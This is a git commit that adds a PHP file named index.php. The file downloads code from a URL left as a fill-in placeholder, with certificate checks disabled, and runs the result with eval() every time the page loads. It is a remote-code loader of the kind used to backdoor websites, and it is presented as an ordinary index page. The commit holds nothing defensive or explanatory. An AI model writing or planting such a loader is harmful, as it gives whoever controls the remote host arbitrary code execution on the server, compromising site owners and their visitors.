f0ccf6e8c35c2544fec3150aed2b3e5114858bc6
yyujimin88-hue <yyujimin88@gmail.com>
2026-01-17 19:26:46 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,10 @@
+<?php
+$url = 'ISI DOMAIN RAW';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+eval("?>" . $fileContents);
+?>
